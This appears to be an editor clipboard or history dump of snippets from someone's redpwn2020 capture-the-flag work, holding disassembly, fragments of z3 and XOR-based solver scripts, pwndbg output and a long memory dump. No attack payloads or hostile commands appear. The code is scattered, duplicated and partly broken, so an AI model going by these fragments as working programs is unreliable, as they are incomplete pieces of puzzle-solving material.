	     8f0:	jne    90d <main+0xb3>
	     8f2:	lea    rax,[rbp-0x120]
	     8f9:	mov    rdi,rax
	     8fc:	call   6e0 <strlen@plt>
	     901:	sub    rax,0x1
	     905:	mov    BYTE PTR [rbp+rax*1-0x120],0x0
	     90c:
	     90d:	lea    rax,[rbp-0x120]
	     914:	mov    rdi,rax
	     917:	call   6e0 <strlen@plt>
	     91c:	cmp    rax,0x48
	     920:	jbe    1b9c2 <main+0x1b168>
9b7a83cffbed004886235f20dfb81e37|file:///home/neo/CTFs/redpwn2020/smartsolver/restr.asm|20142|4|V|asm
	   22f20:	lea    rdi,[rip+0x119]        # 23040 <_IO_stdin_used+0x70>
	   22f27:	call   6d0 <puts@plt>
	   22f2c:	mov    eax,0x0
	   22f31:	mov    rcx,QWORD PTR [rbp-0x18]
	   22f35:	xor    rcx,QWORD PTR fs:0x28
	   22f3c:
	   22f3e:	je     22f45 <main+0x226eb>
	   22f40:	call   6f0 <__stack_chk_fail@plt>
	   22f45:	add    rsp,0x138
	   22f4c:	pop    rbx
	   22f4d:	pop    rbp
	   22f4e:	ret    
	   22f4f:	nop
a83d6fda4f9b87925878cc13758e14ad|file:///home/neo/CTFs/redpwn2020/smartsolver/restr.asm|20113|1|V|asm
	   1b93e:	mov    DWORD PTR [rbp-0x124],0x0
	   1b945:
	   1b948:	jmp    1b98f <main+0x1b135>
	   1b94a:	mov    eax,DWORD PTR [rbp-0x124]
	   1b950:	cdqe   
	   1b952:	movzx  eax,BYTE PTR [rbp+rax*1-0x120]
	   1b959:
	   1b95a:	mov    BYTE PTR [rbp-0x125],al
	   1b960:	movsx  eax,BYTE PTR [rbp-0x125]
	   1b967:	mov    edi,eax
	   1b969:	call   730 <isalpha@plt>
	   1b96e:	test   eax,eax
	   1b970:	jne    1b988 <main+0x1b12e>
	   1b972:	cmp    BYTE PTR [rbp-0x125],0x7b
	   1b979:	je     1b988 <main+0x1b12e>
	   1b97b:	cmp    BYTE PTR [rbp-0x125],0x7d
	   1b982:	jne    22f1f <main+0x226c5>
	   1b988:	add    DWORD PTR [rbp-0x124],0x1
	   1b98f:	mov    eax,DWORD PTR [rbp-0x124]
	   1b995:	movsxd rbx,eax
	   1b998:	lea    rax,[rbp-0x120]
	   1b99f:	mov    rdi,rax
	   1b9a2:	call   6e0 <strlen@plt>
	   1b9a7:	cmp    rbx,rax
	   1b9aa:	jb     1b94a <main+0x1b0f0>
	   1b9ac:	lea    rdi,[rip+0x767c]        # 2302f <_IO_stdin_used+0x5f>
	   1b9b3:	call   6d0 <puts@plt>
	   1b9b8:	mov    eax,0x0
	
882351ebbf6b563d760e643de5a0c3e6|file:///home/neo/CTFs/redpwn2020/smartsolver/restr.asm|3|22|v|asm
	1b16e
55fae3810b7f47f0e1f1ec2ded618346|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|12|1|V|python
	s.add(string[0] == ord('f'))
e522824dc19f50c19f8b88daa8c20ad9|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|15|1|V|python
	s.add(string[0] == ord('g'))
2a1971de778f362901a1451fc25cd89b|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|5|1|V|python
	string = [BitVec(f"c{i}", 8) for i in range(73)]
454df5914308dbf91581ec95356c1980|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|3|1|V|python
	s = Solver()
081c2b6e7970ab7762b57db8677dc1e0|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|13|27|v|python
	('f'))
7b3a2bed5652f4826f847aa7fafbecca|file:///home/neo/CTFs/redpwn2020/smartsolver/main.asm|20149|1|V|asm
	   1b912:	movzx  edx,BYTE PTR [rbp-0xd8]
	   1b919:	movzx  eax,BYTE PTR [rbp-0xda]
	   1b920:	cmp    dl,al
9764506272d4e8a8365c14cf2e01d1e1|file:///home/neo/CTFs/redpwn2020/smartsolver/main.asm|20152|1|V|asm
	   1b922:	jbe    22f19 <main+0x226bf>
aa1a383cb8855741f66be19ea851a14b|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|1|1|V|python
	from z3 import *
	
	s = Solver()
	
	string = [BitVec(f"c{i}", 8) for i in range(73)]
	
	## alnum
	for c in string:
	    print(c)
	    s.add(c >= 65)
	    s.add(c <= 126)
	
	# s.add(string[0] == ord('f'))
	# s.add(string[1] == ord('l'))
	# s.add(string[2] == ord('a'))
	# s.add(string[3] == ord('g'))
	# s.add(string[4] == ord('{'))
	
	with open("restrictions", "r") as f:
	    restrictions = f.readlines()
	    for r in restrictions:
	        a, op, b = r.replace("\x00", "").strip().split(" ")
	        if op == ">":
	            s.add(string[int(a)] > string[int(b)])
	        else:
	            s.add(string[int(a)] < string[int(b)])
	
	
	if s.check() == "sat":
	    print(s.model())
	else:
	    print("No solution found...")
5859dc273791a01f6b06c352da507a7d|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|3|1|V|python
	for n in range(73):
efe904650effcad6e08a0a01c3e79054|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|30|1|V|python
	print(f"N: {n}")
c2eff405fb0b245a1d7b948445b3944c|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|18|1|V|python
	print(s.unsat_core)
69e05bb4480ff713e661f6863488e30a|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|30|15|V|python
	for con in s.unsat_core():
	    print(con)
3eb11c2605b9a9237fba5f75456caef3|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|31|5|V|python
	    print(s.model())
f4039710867b5bcd0c7b51648cc7bdee|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|31|22|V|python
	    for c in s.model():
	        print(c)
18e08aa32ad2d67c165408f262260c8d|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|32|9|v|python
	print(c)
2615f4d0e65b5f4c7f9c0cc3f0765b6e|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|32|8|V|python
	       print(c[0]) 
83416a66fbcaf3e99e0b120cb0368b91|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|30|1|V|python
	if str(s.check()) is "sat":
41e28949b97121d68265abaae3eab890|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|17|1|V|python
	s.add(string[-1] == ord('}'))
65c6a1cbe32e9c81fcb27f6c07b98b30|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|21|1|V|python
	s.add(string[3] == ord('g'))
877b92088fcd2c022dd89fceed69f144|file:///home/neo/CTFs/redpwn2020/smartsolver/clear.py|10|1|V|python
	    line[0] = line[0].strip()
58cccf71985d0e1eb396273f57758e05|file:///home/neo/CTFs/redpwn2020/smartsolver/clear.py|4|1|V|python
	data[-1] = data[-1][:-1]
016ceda8e2bd96bfcc571f96976c0b29|file:///home/neo/CTFs/redpwn2020/smartsolver/clear.py|9|5|V|python
	    if ']' in l
1edc706d337c85df49935e05e95a92ed|file:///home/neo/CTFs/redpwn2020/smartsolver/clear.py|5|1|V|python
	print(data[-1])
b4449b8378838e9834a791c4d02628a2|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|10|1|V|python
	        Or(
52353ea8a2c152cd820a1e9c0f8fbbef|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|11|1|V|python
	            And(c >= 65, c <= 90),
9afb7b469f25600a659637b38c7fc767|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|113|9|V|python
	    print(found)
	    print(len(found))
f34d9e132e231c3f61c91f63f59445de|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|74|9|V|python
	        new_found = set()
06e3cd49d0c7d5cab481cdf626040506|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|116|5|V|python
	    print(new_found)
988d1897451d8667577169399f5d61aa|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|117|5|V|python
	    print(so)
65c5bb52ec3345b68c38eec684db7501|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|115|5|V|python
	    found.update(new_found)
5dc1c1e89cb481c012d32e77ea6b01e9|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|97|39|v|python
	sorted(
70b51e856f1487ec5f56683762ccc47b|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|44|1|V|python
	    for f in found:
	        dec = f - 1
	        while dec in found:
	            for right_limit, value in left_ranges[dec].items():
	                new_val = 0
	                for pos in range(dec, f, 1):
	                    new_val ^= password[pos]
	                left_ranges[f][right_limit] = new_val ^ value
	            for left_limit, value in right_ranges[dec].items():
	                new_val = 0
	                for pos in range(dec, f, 1):
	                    new_val ^= password[pos]
	                right_ranges[f][left_limit] = new_val ^ value
	            dec -= 1
	        inc = f + 1
	        while inc in found:
	            for right_limit, value in left_ranges[inc].items():
	                new_val = 0
	                for pos in range(f, inc, 1):
	                    new_val ^= password[pos]
	                left_ranges[f][right_limit] = new_val ^ value
	            for left_limit, value in right_ranges[inc].items():
	                new_val = 0
	                for pos in range(f, inc, 1):
	                    new_val ^= password[pos]
	                right_ranges[f][left_limit] = new_val ^ value
	            inc += 1
	
9e29ce765a4b1258fd910177ebdc9bc4|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|69|29|v|python
	right_ranges[i][0]
7efd86032cb3981860318f681e7c3f1c|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|69|1|V|python
	                print(right_ranges[i][0],'-',i,': ', right_ranges[i][1])
a83996e144433b55d2945c775db0e771|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|49|17|V|python
	                print(i,'-',left_ranges[i][0],': ', left_ranges[i][1])
4dc2b3d35258047bcf35bb58d51888e3|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|53|51|v|python
	left_ranges[i][1]
67be8dca475cc02ca00ffc546d6ec67a|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|74|50|v|python
	right_ranges[i][1]
fc9e49ee3ba0b2e77816345c3925fe53|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|52|17|V|python
	                print('Left:')
c815915b0b0f197e3787d84854cd6431|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|48|1|V|python
	            print('Left:')
0c3892a50d4e29be38384ff8f9aae2b0|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|48|1|V|python
	        f = int(f)
4dec9705abc4c1c4c64b61713aa481bb|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|35|21|V|python
	                    found.add(l)
bf0c3e9dd201424b3b95b473ac9972d0|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|61|25|V|python
	                        if i not in found:
55b805e2fb356dea59de97a44fe68c89|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|42|1|V|python
	        right_ranges[r][l] = v
6641bc0a429850a0dbd68f68110c5fe7|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|55|21|V|python
	                # print("Left: ", i)
	                # print("Right limits:", left_ranges[i])
c14f0c16d239f599f3873fcc2b3bee90|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|75|19|V|python
	                # print("Right: ", i)
	                # print("Left limits:", right_ranges[i])
26205d6ad178a7f24773bdfb56ce343f|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|104|1|V|python
	            for left_limit, value in right_ranges[dec].items():
	                new_val = 0
	                for pos in range(dec, f, 1):
	                    new_val ^= password[pos]
	                right_ranges[f][left_limit] = new_val ^ value
35832d2ecb012db2233aae2293425e0f|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|113|1|V|python
	            for left_limit, value in right_ranges[inc].items():
	                new_val = 0
	                for pos in range(f, inc, 1):
	                    new_val ^= password[pos]
	                right_ranges[f][left_limit] = new_val ^ value
883a24219923772fa20b106ec5e7c31c|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|25|1|V|python
	        left_ranges[l][r] = v
521f3b39093eb9e80fba722d8867529f|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|14|5|V|python
	    if left_ranges[l] is not None:
1556ab7e64ff7279f1761429fe6acd50|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|26|5|V|python
	    else:
	        left_ranges[l] = {}
	        left_ranges[l][r] = v
04e146b6d95088b3de9f04f6dcaef1d0|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|26|5|V|python
	    if right_ranges[r] is not None:
774dd77313313f6a857ea44c4d8e89e2|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|26|1|V|python
	        left_choices = right_ranges[r]
	        for left_limit, value in left_choices.items():
	            if l == left_limit - 1:
	                password[l] = v ^ value
	                if l not in found:
	                    found.append(l)
	            if l == left_limit + 1:
	                password[left_limit] = v ^ value
	                if left_limit not in found:
	                    found.append(left_limit)
40a05585c353ec872413a1edbe669014|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|36|1|V|python
	        right_ranges[r][l] = v
	    else:
	        right_ranges[r] = {}
	        right_ranges[r][l] = v
a03c9c331bfdfea6c24aa7af42017077|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|17|14|V|python
	    if i == 2:
	        exit()
4a18397a3a5f3f0bf36168851bbedd31|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|8|1|V|python
	print(left_ranges)
f552e8a6ccc3796f01c06382311fe8c9|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|16|11|v|python
	r_choices
92aa943ae9d1dea9abb64cab6ecf45f4|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|16|5|V|python
	    print(len(r_choices))
651ae12d51d496b963b7fedea5760301|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|16|5|V|python
	    print(len(r_choices), l)
1ef74f552f7d97eed0b5a6acb20fc4be|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|9|1|V|python
	for i in left_ranges:
	    i = {}
74b36318a92c5df287b258b907569f6e|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|11|10|V|python
	for i in right_ranges:
	    i = {}
f9343ef910ecebaa1c75912e7c84be2e|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|9|1|V|python
	for i, c in enumerate(left_ranges):
	    left_ranges[i] = {}
6fd48f1b0b192d5690a75411415c154d|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|11|23|v|python
	left_ranges
0b364cf9da27adad5437a7a48b75ba75|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|20|5|V|python
	    print((l,r))
33286c220e0fbcc3ab76da19e624b326|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|1|1|V|asm
	
	r1sc:     file format elf64-x86-64
	
	
	Disassembly of section .text:
	
	0000000000001000 <.text>:
efb2a684e4afb7d55e6147fbe5a332ee|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|29|10|v|asm
	write
135f321c4c32af94a1a010ffdaeb3205|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|19|1|V|asm
	---------------------------------------------------------
7802145f1f361c912858de484a7a6dba|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|24|1|V|asm
	Call print('Access granted'):
96ddbfdb8e917eae43cea82eeb475792|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|23|1|V|asm
	--------------------------------------------------------- 
d068d2c0cad47b5c6554feab9ea897cd|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|31|1|V|asm
	Exit(0):
6f91ef5b619dd26f76d9740408832cce|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|25|44|v|asm
	0xffffffffffffffff
59587cb02e4d781fd0418922299d0039|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|1|1|V|asm
	entry:
c161c241faae8cd288e1fa454776227f|file:///tmp/st-edit.Epvm8A|1905|1|V|
	pwndbg> 
ad2423d01f1100b1dfd0868e96db9165|file:///tmp/st-edit.Epvm8A|1|1|V|
	05:0028‚îÇ      0x7fffffffdf50 ‚Äî‚ñ∏ 0x7fffffffe2b0 ‚óÇ‚Äî 'USER=neo' 
	06:0030‚îÇ      0x7fffffffdf58 ‚Äî‚ñ∏ 0x7fffffffe2b9 ‚óÇ‚Äî 0x5245545f5353454c ('LESS_TER') 
	07:0038‚îÇ      0x7fffffffdf60 ‚Äî‚ñ∏ 0x7fffffffe2ce ‚óÇ‚Äî 'XDG_SEAT=seat0' 
	‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
	 ‚ñ∫ f 0     55555555509b 
	   f 1     555555555031 
	   f 2                1 
	   f 3     7fffffffe277 
	   f 4                0 
	‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
	pwndbg> x/gx $rbp + $rsi*8 + 0x10 
	0x5555555570f8: 0x0000000000000000 
360f4a32da02b1c9aaab72c7e8ca909a|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|1|1|V|
	x/300gx 
d92f3c02e7f9a5b743036a82d5681aac|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|15|1|V|python
	        rsi += 3
	        continue
a916b2ed1b4cc20c248d73cfb98ba239|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|17|1|V|python
	    if data[rsi+2] == 2:
2441e87a4c74c498639b665dba91e23d|file:///tmp/st-edit.uJaEBk|1946|37|v|
	Cannot access memory at address 0x555555558000 
b692447fbd7f69761c2c27012861f9c0|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|1|1|V|
	0x0000000000000009
	0x0000000000000009
	0x0000000000000010
	0x616428746e697270
	0x000000000a296174
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000000000001
	0x0000000000000001
	0x0000000000000052
	0xfffffffffffffffe
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000a
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000d
	0x000000000000000d
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000b
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000d
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000a
	0x000000000000000e
	0x0000000000000052
	0x0000000000000009
	0x0000000000000009
	0x000000000000002b
	0x000000000000000b
	0x0000000000000003
	0x0000000000000000
	0x000000000000000b
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000b
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000d
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x0000000000000004
	0x0000000000000000
	0x000000000000000b
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000b
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000d
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x0000000000000005
	0x0000000000000000
	0x000000000000000b
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000b
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000d
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x0000000000000006
	0x0000000000000000
	0x000000000000000b
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000d
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x000000000000000b
	0x0000000000000000
	0x000000000000000c
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000b
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000c
	0x000000000000000c
	0x0000000000000000
	0x000000000000000d
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x000000000000000c
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x000000000000000b
	0x0000000000000007
	0x0000000000000000
	0x000000000000000c
	0x0000000000000008
	0x0000000000000000
	0x000000000000010f
	0x0000000000000003
	0x0000000000000000
	0x0000000000000110
	0x0000000000000004
	0x0000000000000000
	0x0000000000000111
	0x0000000000000005
	0x0000000000000000
	0x0000000000000112
	0x0000000000000006
	0x0000000000000000
	0x0000000000000113
	0x0000000000000007
	0x0000000000000000
	0x0000000000000114
	0x0000000000000008
	0x0000000000000000
	0x000000000000000f
	0x0000000000000005
	0x0000000000000115
	0x000000000000000f
	0x0000000000000007
	0x0000000000000118
	0x000000000000000f
	0x0000000000000004
	0x000000000000011b
	0x000000000000000f
	0x0000000000000006
	0x000000000000011e
	0x000000000000000f
	0x0000000000000008
	0x0000000000000121
	0x000000000000000f
	0x0000000000000003
	0x0000000000000124
	0x0000000000000000
	0x0000000000000000
	0x0000000000000001
	0x73899430b0be9520
	0x5dd2f647ee29d4cd
	0x72293ef63f8e0a7a
	0x71d8bf8cc0467ed1
	0x5f9d8902895817da
	0x73c3fe96ce29e753
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000000
	0x0000000000000009
	0x0000000000000009
	0x0000000000000001
	0x7472747368732e00
	0x65746e692e006261
	0x65746f6e2e007072
	0x6975622e756e672e
	0x672e0064692d646c
	0x00687361682e756e
	0x006d79736e79642e
	0x007274736e79642e
	0x652e00747865742e
	0x00656d6172665f68
	0x63696d616e79642e
	0x0000617461642e00
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x000000010000000b
	0x0000000000000002
	0x0000000000000238
	0x0000000000000238
	0x000000000000001c
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000700000013
	0x0000000000000002
	0x0000000000000254
	0x0000000000000254
	0x0000000000000024
	0x0000000000000000
	0x0000000000000004
	0x0000000000000000
	0x6ffffff600000026
	0x0000000000000002
	0x0000000000000278
	0x0000000000000278
	0x000000000000001c
	0x0000000000000004
	0x0000000000000008
	0x0000000000000000
	0x0000000b00000030
	0x0000000000000002
	0x0000000000000298
	0x0000000000000298
	0x0000000000000018
	0x0000000100000005
	0x0000000000000008
	0x0000000000000018
	0x0000000300000038
	0x0000000000000002
	0x00000000000002b0
	0x00000000000002b0
	0x0000000000000001
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000100000040
	0x0000000000000006
	0x0000000000001000
	0x0000000000001000
	0x00000000000000b9
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000100000046
	0x0000000000000002
	0x0000000000002000
	0x0000000000002000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000008
	0x0000000000000000
	0x0000000600000050
	0x0000000000000003
	0x0000000000002f30
	0x0000000000002f30
	0x00000000000000d0
	0x0000000000000005
	0x0000000000000008
	0x0000000000000010
	0x0000000100000059
	0x0000000000000003
	0x0000000000003000
	0x0000000000003000
	0x0000000000000970
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000300000001
	0x0000000000000000
	0x0000000000000000
	0x0000000000003970
	0x000000000000005f
	0x0000000000000000
	0x0000000000000001
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
